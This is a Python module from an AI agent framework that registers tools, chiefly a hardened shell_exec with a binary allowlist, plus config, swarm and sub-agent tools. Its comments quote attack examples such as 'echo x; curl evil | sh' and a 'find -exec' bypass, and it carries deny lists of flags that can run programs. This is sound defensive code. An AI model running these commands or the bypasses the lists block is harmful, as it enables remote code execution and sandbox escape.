"""Shell, config, environment, and diagnostics tools.

Extracted from the former ``tool_builtins.py`` god module (2,833
lines) — audit O5. Tool bodies are unchanged; registration order
within this group is preserved.
"""

from __future__ import annotations

import logging
from datetime import UTC
from pathlib import Path
from typing import TYPE_CHECKING, Any

logger = logging.getLogger(__name__)

if TYPE_CHECKING:
    pass

def _qnorm(q: str) -> str:
    """Normalize a memory q-filter: underscores/hyphens -> single spaces,
    lowercased. Paired with REPLACE(...) in SQL so 'memory system' matches
    user_memory_system (2026-08-27 report — the literal LIKE filter missed
    it while FTS memory_search matched fine)."""
    import re as _re

    return _re.sub(r"[_\-\s]+", " ", str(q or "").strip().lower()).strip()




_pending_dispatch_tasks: set[Any] = set()


def register_system_tools(registry: Any) -> None:
    """Register the system tools onto *registry*."""

    @registry.register(
        description="Get the current date, time, and timezone in ISO-8601 format.",
        category="utility",
    )
    async def current_datetime() -> str:
        from datetime import datetime

        now = datetime.now(UTC)
        return now.isoformat()
    # ── MCP server diagnostics (agent-facing) ─────────────────────
    # Exposed because an agent asked to "test the MCP server" otherwise
    # has no valid path: python_exec blocks network imports, shell_exec
    # blocks curl, browser JS hits CORS — and it loops generic tools
    # until the stagnation breaker fires. This runs the same
    # initialize → tools/list handshake the /mcp UI Test button uses.

    @registry.register(
        description=(
            "Test a configured MCP server connection: runs the real "
            "initialize → tools/list handshake and reports tool count or the "
            "exact error (auth failure, spawn error, timeout). Use this when "
            "asked to test/check/verify an MCP server — do NOT probe the "
            "server URL with curl/python_exec (sandboxed)."
        ),
        category="system",
    )
    async def mcp_test_server(name: str) -> str:
        try:
            from kazma_core.mcp.manager import AsyncMCPManager
            from kazma_core.mcp_servers_store import list_mcp_servers

            servers = list_mcp_servers()
            target = None
            for s in servers:
                if str(s.get("name", "")).lower() == (name or "").strip().lower():
                    target = s
                    break
            if target is None:
                known = ", ".join(str(s.get("name")) for s in servers) or "(none)"
                return f"Error: MCP server '{name}' not found. Configured servers: {known}"

            try:
                from kazma_core.workspace.mcp_rebind import apply_workspace_to_server_config

                target = apply_workspace_to_server_config(dict(target))
            except Exception:
                pass

            manager = AsyncMCPManager()
            try:
                count = await manager.connect_from_config(
                    [dict(target)], raise_on_error=True
                )
                tools = [
                    str((t.get("function") or {}).get("name") or t.get("name") or "")
                    for t in manager.get_all_tool_schemas()
                ]
                return (
                    f"OK: '{target.get('name')}' connected — {count} tool(s): "
                    + (", ".join(t for t in tools[:20] if t) or "(none)")
                )
            finally:
                try:
                    await manager.disconnect_all()
                except Exception:
                    pass
        except Exception as exc:
            # raise_on_error surfaces the real handshake error (401, spawn
            # failure, etc.) — report it verbatim; that's the whole point.
            return f"Error: MCP test failed — {exc}"
    @registry.register(
        description=(
            "Save a configuration setting to the persistent settings store. "
            "Use this when the user asks to save, update, or configure a setting "
            "(e.g. Telegram allowed users, Discord tokens, model preferences). "
            "Common keys: connectors.telegram.allowed_users (comma-separated user IDs), "
            "connectors.discord.allowed_users, agent.personality, agent.language. "
            "This tool requires user approval before applying changes."
        ),
        category="system",
    )
    async def config_save(key: str, value: str) -> str:
        from kazma_core.config_store import get_config_store, is_sensitive_config_key

        # Block security-critical + any secret-class keys (audit H8)
        _BLOCKED_PREFIXES = (
            "security.",
            "kazma_secret",
            "vault.",
            "yolo.",
        )
        if any(key.startswith(p) or key == p.rstrip(".") for p in _BLOCKED_PREFIXES):
            return f"Error: Cannot modify restricted key '{key}'."
        if is_sensitive_config_key(key):
            return (
                f"Error: '{key}' is a sensitive credential. "
                "Change it in Settings UI — not via tools."
            )

        store = get_config_store()
        store.set(
            key,
            value,
            category="connectors" if key.startswith("connectors.") else "general",
        )
        logger.info("[config_save] Saved setting: %s", key)
        # Never echo secret-like values back into chat
        return f"Setting saved: {key}"
    @registry.register(
        description=(
            "Read a configuration setting from the persistent settings store. "
            "Returns a structured status so you can tell missing vs unset vs set: "
            "status=missing (key never stored), unset (key present but empty), "
            "set (has a value), or secret (value exists but is hidden). "
            "Use for allowed users, agent.personality, agent.max_iterations, etc."
        ),
        category="system",
    )
    async def config_read(key: str) -> str:
        import json as _json

        from kazma_core.config_store import get_config_store

        if not key or not str(key).strip():
            return _json.dumps(
                {
                    "key": key or "",
                    "status": "error",
                    "value": None,
                    "message": "No key provided.",
                },
                ensure_ascii=False,
            )

        store = get_config_store()
        _MISSING = object()
        val = store.get(key, _MISSING)

        # Key alias fallback resolution (e.g. agent.model -> registry.active_model)
        if val is _MISSING:
            key_clean = (key or "").strip().lower()
            aliases: dict[str, list[str]] = {
                "agent.model": ["registry.active_model", "registry.active_chat_model", "models.default", "llm.model"],
                "model": ["registry.active_model", "registry.active_chat_model", "models.default", "llm.model"],
                "active_model": ["registry.active_model", "registry.active_chat_model", "models.default"],
                "agent.active_model": ["registry.active_model", "registry.active_chat_model", "models.default"],
                "agent.provider": ["registry.active_provider", "llm.provider"],
                "provider": ["registry.active_provider", "llm.provider"],
                "active_provider": ["registry.active_provider", "llm.provider"],
            }
            for alt_key in aliases.get(key_clean, []):
                alt_val = store.get(alt_key, _MISSING)
                if alt_val is not _MISSING and alt_val is not None:
                    val = alt_val
                    break

        key_l = (key or "").lower()
        secret_markers = (
            "api_key", "apikey", "token", "secret", "password",
            "passwd", "private_key", "credentials", "auth",
        )
        is_secret_key = any(m in key_l for m in secret_markers)

        if val is _MISSING:
            payload = {
                "key": key,
                "status": "missing",
                "value": None,
                "message": (
                    f"Key '{key}' is not stored (not in ConfigStore/YAML). "
                    "It may still have a code default when the app reads it."
                ),
            }
        elif val is None or val == "" or val == [] or val == {}:
            payload = {
                "key": key,
                "status": "unset",
                "value": None,
                "message": f"Key '{key}' exists but has an empty value.",
            }
        elif is_secret_key:
            payload = {
                "key": key,
                "status": "secret",
                "value": None,
                "message": (
                    f"Key '{key}' is set (value hidden — secrets are not "
                    "readable via tools). Change in Settings UI if needed."
                ),
            }
        else:
            # Coerce non-string values for display
            display = val if isinstance(val, (str, int, float, bool)) else str(val)
            payload = {
                "key": key,
                "status": "set",
                "value": display,
                "message": f"{key} is set.",
            }
            if key == "agent.personality":
                try:
                    from kazma_core.personalities import load_personality
                    profile = load_personality(config={})
                    p_name = profile.get("name") or display
                    p_desc = profile.get("description") or ""
                    p_prompt = profile.get("system_prompt") or ""
                    payload["description"] = f"{p_name}: {p_desc}".strip(": ")
                    payload["prompt_preview"] = p_prompt[:300] + ("..." if len(p_prompt) > 300 else "")
                    payload["message"] = f"agent.personality is set to '{display}' ({p_desc})."
                except Exception:
                    pass
        return _json.dumps(payload, ensure_ascii=False)
    @registry.register(
        description=(
            "Execute a shell command (allowlisted binaries only) and return "
            "stdout+stderr. Prefer native tools first: file_list/file_read/"
            "file_search/file_write, git_status/git_*, python_exec/code_exec, "
            "install_agent_skill. Do NOT use shell for: cd (not allowed — "
            "cwd is already the workspace), cat/ls (use file_*), git "
            "(use git tools), python/node/bash (use python_exec). "
            "Multi-step shell needs absolute paths under the workspace."
        ),
        category="system",
    )
    async def shell_exec(command: str, timeout: int = 30) -> str:
        import asyncio
        import shlex
        # Log all shell_exec invocations — this is a dangerous tool
        logger.warning(
            "[SECURITY] shell_exec called: %s",
            command[:200] if len(command) > 200 else command,
        )
        # Parse command into args — NO shell interpretation
        try:
            args = shlex.split(command)
        except ValueError as exc:
            return f"Error: Invalid command syntax: {exc}"

        if not args:
            return "Error: Empty command"

        # Restricted PATH — only allow read-only / build-safe binaries.
        # NO interpreters (python/node/bash/sh) — those are RCE vectors
        # even after a single HITL approval. Use python_exec / code_exec
        # for code. Aligns with swarm ShellTool._READ_ONLY_COMMANDS.
        # NO network tools (curl, wget), NO container runtimes (docker).
        from kazma_core.safety.post_hitl import (
            production_archive_allowed,
            resolve_shell_binary,
            restricted_child_env,
            shell_mutate_allowed,
            shell_strict_mode,
        )

        _SAFE_BINARIES = {
            # Read-only system (no `env` — dumps secrets after one HITL)
            "ls", "cat", "head", "tail", "grep", "find", "wc", "sort",
            "uniq", "echo", "printf", "date", "whoami", "pwd",
            "df", "du", "free", "uptime", "uname", "hostname",
            # Build tools (no shell interpreters)
            "git", "uv", "pytest", "ruff", "mypy",
            # Text processing (read-only) — no `ps` (env leak on some OS)
            "jq", "tr", "cut",
            # Process control (safe)
            "sleep",
            # Note: `kazma` / `ps` removed from prod allowlist (audit H4)
        }
        # File ops: off in multi-user/prod unless KAZMA_SHELL_ALLOW_MUTATE=1
        if shell_mutate_allowed():
            _SAFE_BINARIES |= {"mkdir", "cp", "mv", "touch"}
        # Archives: disabled by default in production strict mode
        # (tar/zip can write outside cwd via absolute entries).
        if production_archive_allowed():
            _SAFE_BINARIES |= {
                "tar", "gzip", "gunzip", "zip", "unzip",
            }
        # Dev-only extras when not in production
        import os as _os_bin
        if (_os_bin.environ.get("KAZMA_PRODUCTION") or "").lower() not in (
            "1", "true", "on", "yes",
        ):
            _SAFE_BINARIES = set(_SAFE_BINARIES) | {"ps", "pgrep", "kazma"}
        import os

        p = Path(args[0])
        binary = p.name
        if os.name == "nt" and p.suffix.lower() == ".exe":
            binary = p.stem

        if binary not in _SAFE_BINARIES:
            # Also check if it's an absolute/relative path to a safe binary
            posix_path = p.as_posix()
            if not any(
                posix_path.endswith(f"/{b}") or (os.name == "nt" and posix_path.endswith(f"/{b}.exe"))
                for b in _SAFE_BINARIES
            ):
                hint = ""
                low = command.lower()
                if binary in ("node", "npm", "npx") or "skills add" in low or "agent-skills" in low:
                    hint = (
                        "\n\nTo install an Agent Skill (agentskills.io / SKILL.md), "
                        "use install_agent_skill(source='owner/repo') instead — "
                        "e.g. install_agent_skill(source='shadcn/improve'). "
                        "Node/npm/npx are intentionally blocked; skill install "
                        "does not need them."
                    )
                elif binary in ("cd", "pushd", "popd", "chdir"):
                    hint = (
                        "\n\n`cd` is not allowed (shell builtins). "
                        "Commands already run with cwd = active workspace. "
                        "Use absolute paths under the workspace, or native "
                        "file_*/git_*/python_exec tools instead of multi-step shell."
                    )
                elif binary in ("cat", "less", "more", "head", "tail") and "file_read" not in low:
                    hint = (
                        "\n\nPrefer file_read / file_list / file_search for workspace files."
                    )
                elif binary == "git":
                    hint = (
                        "\n\nPrefer native git tools (git_status, etc.) when available."
                    )
                elif binary in ("python", "python3", "node", "bash", "sh", "zsh"):
                    hint = (
                        "\n\nInterpreters are blocked in shell_exec. Use python_exec "
                        "or code_exec for short scripts."
                    )
                return (
                    f"Error: '{binary}' is not in the allowed binary list. "
                    f"Allowed: {', '.join(sorted(_SAFE_BINARIES))}"
                    f"{hint}"
                )

        try:
            # Restrict context strictly to active workspace
            from kazma_core.tools.file_write import _get_workspace
            cwd = _get_workspace()
            cwd_s = str(cwd)

            # Resolve binary under restricted PATH (post-HITL hardening)
            child_env = restricted_child_env(cwd=cwd_s)
            if shell_strict_mode():
                resolved = resolve_shell_binary(
                    args[0], restricted_path=child_env.get("PATH", "")
                )
                if not resolved:
                    return (
                        f"Error: could not resolve '{args[0]}' under restricted PATH. "
                        "Post-HITL shell only runs system/build tools on the "
                        "allowlist (set KAZMA_SHELL_STRICT=0 to relax in lab)."
                    )
                args = [resolved, *args[1:]]

            # Reject absolute paths outside workspace (audit H4)
            for a in args[1:]:
                if not a or a.startswith("-"):
                    continue
                # Rough path detection
                looks_path = (
                    a.startswith("/")
                    or a.startswith("\\")
                    or (len(a) > 2 and a[1] == ":" and a[0].isalpha())
                    or ".." in a.replace("\\", "/")
                )
                if not looks_path:
                    continue
                try:
                    import os as _os

                    cand = _os.path.realpath(
                        a if _os.path.isabs(a) else _os.path.join(cwd_s, a)
                    )
                    root_n = _os.path.realpath(cwd_s)
                    if _os.name == "nt":
                        cand, root_n = cand.lower(), root_n.lower()
                    if cand != root_n and not cand.startswith(root_n + _os.sep):
                        return (
                            f"Error: path '{a}' is outside the workspace "
                            f"({cwd_s}). Absolute paths must stay inside the workspace."
                        )
                except Exception:
                    pass

            # Per-binary argument policy (audit F-03).
            #
            # The allowlist above vets args[0] only, and the path guard below
            # vets arguments that *look like paths*. Neither catches an
            # allowlisted binary being asked to run another program by name:
            # `find . -exec whoami +` passes both (bare name is not
            # path-shaped, and `+` avoids the `;` metacharacter rejection),
            # which defeats the "no interpreters even after one HITL approval"
            # rule this allowlist exists to enforce.
            _EXEC_CAPABLE_ARGS: dict[str, tuple[str, ...]] = {
                "find": (
                    "-exec", "-execdir", "-ok", "-okdir",
                    "-delete", "-fprintf", "-fprint", "-fls",
                ),
                "git": (
                    "--upload-pack", "--receive-pack", "--exec-path",
                    "-c", "--config-env", "--upload-archive",
                ),
                "tar": (
                    "--use-compress-program", "--to-command", "-I",
                    "--checkpoint-action", "--rmt-command", "--rsh-command",
                ),
                "zip": ("-TT", "--unzip-command"),
                "unzip": ("-TT",),
                "grep": ("-f", "--file"),  # reads a pattern file outside cwd
                "jq": ("-f", "--from-file"),
            }
            for _a in args[1:]:
                _flag = _a.split("=", 1)[0]
                if _flag in _EXEC_CAPABLE_ARGS.get(binary, ()):
                    return (
                        f"Error: '{_flag}' is not allowed for {binary} — it runs "
                        f"another program (or writes/deletes outside the vetted "
                        f"argument set) and would bypass the binary allowlist. "
                        f"Use python_exec for multi-step work, or a native "
                        f"file_*/git_* tool."
                    )

            # git subcommand denylist (destructive / credential / rewrite)
            if binary == "git" and len(args) > 1:
                sub = args[1].lstrip("-")
                blocked_git = {
                    "push", "credential", "credential-manager",
                    "credential-store", "credential-cache",
                    "reset", "rebase", "filter-branch", "filter-repo",
                    "remote", "submodule",
                    # `clone` reaches the network and honours transport helpers
                    # (ext::, gitProxy). Cloning belongs to the audited
                    # /api/github/repos/clone route (audit F-03).
                    "clone", "fetch", "archive", "daemon", "http-backend",
                }
                joined = " ".join(args[1:]).lower()
                if (
                    sub in blocked_git
                    or "config --global" in joined
                    or "clean -fd" in joined
                    or " push " in f" {joined} "
                    or "--force" in joined
                    or " -f " in f" {joined} "
                ):
                    return (
                        f"Error: git subcommand/args not allowed: {' '.join(args[1:])}. "
                        "push/force/credential/reset/rebase/global config/clean -fd are blocked."
                    )

            # Check if command uses shell pipelines or metacharacters (| && ; > <)
            # SECURITY: These are REJECTED, not passed to a shell. The old code
            # fell through to create_subprocess_shell(raw_command) which bypassed
            # the safe-binary check entirely — e.g. "echo x; curl evil | sh"
            # passed because only "echo" was checked. Now we hard-reject.
            has_pipe = any(op in command for op in ("|", "&&", ";", ">", "<"))

            if has_pipe:
                return (
                    "Error: Shell metacharacters (|, &&, ;, >, <) are blocked "
                    "for security — they bypass the safe-binary allowlist. "
                    "Use python_exec for multi-step operations, or chain "
                    "native tools (file_read, file_write, git_*) individually."
                )

            # Windows: the server runs a SelectorEventLoop (psycopg compat),
            # which does NOT implement subprocess transports —
            # asyncio.create_subprocess_exec raises NotImplementedError and
            # every shell_exec silently returned "Shell command execution
            # failed.". Run a blocking Popen in a worker thread instead
            # (to_thread), keeping the bounded-output + timeout semantics.
            import subprocess
            import threading

            def _run_shell_capped(
                args: list[str],
                *,
                cwd: str | None,
                env: dict[str, str] | None,
                timeout: float,
            ) -> tuple[bytes, bytes, int]:
                proc = subprocess.Popen(
                    args,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=cwd,
                    env=env,
                )
                chunks: dict[str, bytes] = {"out": b"", "err": b""}

                def _drain(stream, key: str, limit: int) -> None:
                    while len(chunks[key]) < limit:
                        chunk = stream.read(min(4096, limit - len(chunks[key])))
                        if not chunk:
                            break
                        chunks[key] += chunk

                t_out = threading.Thread(
                    target=_drain, args=(proc.stdout, "out", 20_000), daemon=True
                )
                t_err = threading.Thread(
                    target=_drain, args=(proc.stderr, "err", 10_000), daemon=True
                )
                t_out.start()
                t_err.start()
                try:
                    proc.wait(timeout=timeout)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
                    raise
                t_out.join(timeout=2)
                t_err.join(timeout=2)
                return chunks["out"], chunks["err"], proc.returncode

            try:
                stdout, stderr, returncode = await asyncio.to_thread(
                    _run_shell_capped,
                    args,
                    cwd=cwd,
                    env=child_env,
                    timeout=timeout,
                )
            except subprocess.TimeoutExpired:
                return f"Error: Command timed out after {timeout}s"

            output = stdout.decode("utf-8", errors="replace")
            err_output = stderr.decode("utf-8", errors="replace")
            if err_output:
                output += f"\n[stderr]\n{err_output}"
            if returncode != 0:
                output += f"\n[exit code: {returncode}]"
            return output[:10_000]  # cap output
        except FileNotFoundError:
            return f"Error: Command not found: {args[0]}"
        except Exception as exc:
            return "Error: Shell command execution failed."


    # ── Sub-agent spawning tools ─────────────────────────────
    @registry.register(
        description=(
            "Spawn a sub-agent to handle a focused task independently. "
            "The sub-agent has its own context and tools. Use this for "
            "research, code generation, file operations, or any task that "
            "benefits from dedicated focus. Returns a summary when done."
        ),
        category="delegation",
    )
    async def spawn_agent(
        goal: str,
        context: str = "",
        tools: str = "[]",
    ) -> str:
        import json as _json

        from kazma_core.agent.sub_agent import get_sub_agent_manager

        manager = get_sub_agent_manager()
        if manager is None:
            return "Error: Sub-agent manager not initialized."

        try:
            tool_list = _json.loads(tools) if isinstance(tools, str) else tools
        except _json.JSONDecodeError:
            tool_list = None

        result = await manager.spawn(goal=goal, context=context, tools=tool_list)
        return _json.dumps(result.to_dict(), ensure_ascii=False, indent=2)
    @registry.register(
        description=(
            "Spawn multiple sub-agents in parallel for independent tasks. "
            "Use this when you have 2-3 unrelated tasks that can run concurrently. "
            "Returns a list of results, one per task."
        ),
        category="delegation",
    )
    async def spawn_agents(tasks: str) -> str:
        import json as _json

        from kazma_core.agent.sub_agent import get_sub_agent_manager

        manager = get_sub_agent_manager()
        if manager is None:
            return "Error: Sub-agent manager not initialized."

        try:
            task_list = _json.loads(tasks) if isinstance(tasks, str) else tasks
        except _json.JSONDecodeError:
            return "Error: tasks must be a JSON array."

        if not isinstance(task_list, list):
            return "Error: tasks must be a JSON array."

        results = await manager.spawn_parallel(task_list)
        return _json.dumps(
            [r.to_dict() for r in results],
            ensure_ascii=False,
            indent=2,
        )
    # ── Swarm dispatch (visible in /swarm panel) ──────────────
    @registry.register(
        description=(
            "Dispatch a research or analysis task to the Swarm engine. "
            "The task appears in the Swarm panel (/swarm) with full worker "
            "progress, results, cost, and traceability. Returns a task ID "
            "immediately — use check_swarm_task to retrieve the result when "
            "ready. Use this instead of spawn_agent when you want the work "
            "to be visible and traceable in the panel."
        ),
        category="swarm",
    )
    async def dispatch_swarm(
        prompt: str,
        worker: str = "auto",
        context: str = "",
    ) -> str:
        import asyncio as _asyncio

        from kazma_core.swarm import SwarmTask, TaskType, get_swarm_engine

        engine = get_swarm_engine()
        if engine is None:
            return (
                "Error: Swarm engine not initialized. "
                "Configure swarm workers in kazma.yaml."
            )

        # Auto-register a default "researcher" worker if none exist, so
        # dispatch_swarm works out of the box without manual setup.
        if not engine.worker_names:
            try:
                from kazma_core.model_registry import get_model_registry
                from kazma_core.swarm.config import WorkerCapabilities, WorkerConfig

                reg = get_model_registry()
                profile = reg.get_active_profile()
                engine.add_worker(WorkerConfig(
                    name="researcher",
                    type="in_process",
                    model=profile.get("model", ""),
                    provider=profile.get("provider", ""),
                    role="researcher",
                    system_prompt=(
                        "You are a Researcher worker. Follow the research protocol: "
                        "≥2 search queries, ≥2 full sources via read_url_to_file, "
                        "digest long pages, then structured findings with URL citations. "
                        "For comprehensive papers use run_research_pipeline. "
                        "Never conclude from search snippets alone."
                    ),
                    capabilities=WorkerCapabilities(
                        role="researcher",
                        expertise=["research", "analysis", "writing"],
                        tools=[
                            "web_search",
                            "read_url",
                            "read_url_to_file",
                            "crawl_site",
                            "list_research_chunks",
                            "read_research_chunk",
                            "summarize_research_file",
                            "digest_research_file",
                            "synthesize_from_digests",
                            "run_research_pipeline",
                            "file_write",
                        ],
                    ),
                ))
                logger.info("[dispatch_swarm] Auto-registered 'researcher' worker")
            except Exception as exc:
                return (
                    f"Error: No swarm workers registered and could not "
                    f"auto-create one: {exc}. Add workers in the Swarm "
                    f"panel or kazma.yaml."
                )

        # Resolve "auto" to the first available worker.
        if worker == "auto":
            worker = engine.worker_names[0] if engine.worker_names else "researcher"

        task = SwarmTask(
            prompt=prompt,
            workers=[worker],
            type=TaskType.DISPATCH,
            context=context,
            timeout=300.0,
            metadata={"source": "chat", "kind": "research"},
        )
        # Dispatch in the background so the tool returns immediately.
        # Register on engine._task_handles so cancel_task / panel Stop
        # can cancel the live asyncio work (not just mark maps cancelled).
        _bg_task = _asyncio.create_task(engine.dispatch(task))
        _pending_dispatch_tasks.add(_bg_task)
        try:
            engine.register_task_handle(task.id, _bg_task)
        except Exception as reg_exc:
            logger.debug(
                "[dispatch_swarm] register_task_handle failed: %s", reg_exc
            )

        def _cleanup_handle(
            h: Any, tid: str = task.id, eng: Any = engine
        ) -> None:
            _pending_dispatch_tasks.discard(h)
            try:
                if eng is not None and hasattr(eng, "unregister_task_handle"):
                    eng.unregister_task_handle(tid)
            except Exception:
                pass

        _bg_task.add_done_callback(_cleanup_handle)
        return (
            f"Swarm task dispatched to worker '{worker}' "
            f"(id: {task.id}). It's visible in the Swarm panel. "
            f"Use check_swarm_task('{task.id}') to get the result."
        )
    @registry.register(
        description=(
            "Check the status and result of a dispatched Swarm task. "
            "Returns the full result when the task is complete, or a "
            "status message if still running. Poll this every few seconds "
            "until you get a completed result."
        ),
        category="swarm",
    )
    async def check_swarm_task(task_id: str) -> str:
        from kazma_core.swarm import get_swarm_engine

        engine = get_swarm_engine()
        # Check in-memory active tasks first, then TaskStore (persisted).
        task = None
        if engine:
            task = engine.get_active_task(task_id)
        if task is None and engine and getattr(engine, "_task_store", None):
            task = engine._task_store.get_task(task_id)
        if task is None:
            return f"Task {task_id} not found."

        status_str = str(task.status).lower().replace("taskstatus.", "")
        if status_str in ("running", "pending"):
            elapsed_str = ""
            started_iso = getattr(task, "started_at", None)
            if started_iso:
                try:
                    from datetime import datetime, timezone
                    dt = datetime.fromisoformat(started_iso.replace("Z", "+00:00"))
                    elapsed = (datetime.now(timezone.utc) - dt).total_seconds()
                    tot_timeout = getattr(task, "timeout", None) or 300.0
                    elapsed_str = f" (elapsed: {elapsed:.1f}s, timeout: {tot_timeout:.0f}s)"
                except Exception:
                    pass
            workers_str = f", worker: {task.workers[0]}" if task.workers else ""
            return (
                f"Task {task_id} is still {status_str}{elapsed_str}{workers_str}. "
                f"Check again in a moment."
            )

        result = task.result
        if result and result.error:
            return f"Task {task_id} failed: {result.error}"
        if result:
            output = (
                result.aggregated_output
                or result.synthesized_output
                or ""
            )
            if not output and result.worker_results:
                output = result.worker_results[0].output
            cost = getattr(result, "total_cost", 0.0)
            duration = getattr(result, "duration_seconds", 0.0)
            return (
                f"Task {task_id} completed.\n"
                f"Cost: ${cost:.4f}\n"
                f"Duration: {duration:.1f}s\n\n"
                f"{output}"
            )
        return f"Task {task_id} status: {status_str} (no result yet)."

    # ── Code execution tool ───────────────────────────────────
    @registry.register(
        description=(
            "Execute Python code in a sandboxed subprocess. Returns stdout + stderr. "
            "Max 30s timeout, 512MB memory, isolated mode (no site-packages). "
            "Use for calculations, data processing, prototyping."
        ),
        category="code",
    )
    async def python_exec(code: str, timeout: int = 30) -> str:
        from kazma_core.tools.code_exec import python_exec as _exec

        return await _exec(code=code, timeout=timeout)
    # ── Context window indicator ──────────────────────────────
    @registry.register(
        description=(
            "Show context window usage — token count, percentage, and summarization "
            "threshold. Use '/context details' for per-role breakdown."
        ),
        category="diagnostics",
    )
    async def context_info(details: bool = False) -> str:
        from kazma_core.tools.context_cmd import context_cmd as _ctx
        from kazma_core.tools.export_session import get_current_session_messages

        # Messages come from the per-invocation ContextVar set by the
        # graph's tool-worker node.  This keeps concurrent sessions
        # isolated (no shared module-global list).
        messages = get_current_session_messages()
        return await _ctx(messages, detailed=details)
    @registry.register(
        description=(
            "Use the computer (screenshot → click/type/key loop) to accomplish a "
            "goal in the browser. Prefer browser_navigate/click when you already "
            "know CSS selectors. HITL danger-tier. Optional url= to open first. "
            "max_steps default 8 (hard cap 15). Kill-switch: KAZMA_COMPUTER_USE=0."
        ),
        category="browser",
    )
    async def computer_use(
        goal: str,
        url: str = "",
        max_steps: int = 8,
    ) -> str:
        from kazma_core.tools.computer_use import computer_use as _cu

        return await _cu(goal, url=url, max_steps=max_steps)
